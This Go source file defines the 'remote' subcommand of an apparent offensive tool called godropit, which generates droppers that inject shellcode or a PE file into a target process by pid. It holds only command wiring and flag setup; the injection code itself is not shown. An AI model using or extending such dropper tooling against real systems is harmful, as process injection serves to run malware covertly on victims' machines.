package cmd

import (
	"log"

	"godropit/internal/gengo"

	"github.com/spf13/cobra"
)

var pid string

// remoteCmd represents the remote command
var remoteCmd = &cobra.Command{
	Use:   "remote",
	Short: "Execute in the remote process",
	Long:  `Executes in the remote process. Executes shellcode in the specified pid. `,
	Run: func(cmd *cobra.Command, args []string) {
		if input == "" {
			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
		}
		gengo.NewRemoteDropper(input, output, domain, name, pid, time, false, shared, arch)
	},
}

func init() {
	newCmd.AddCommand(remoteCmd)

	remoteCmd.MarkFlagRequired("in")
	remoteCmd.MarkFlagRequired("name")
	remoteCmd.MarkFlagRequired("out")

	// Here you will define your flags and configuration settings.

	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// remoteCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	remoteCmd.Flags().StringVar(&pid, "pid", "0", "Set remote process pid, default is 0")
}
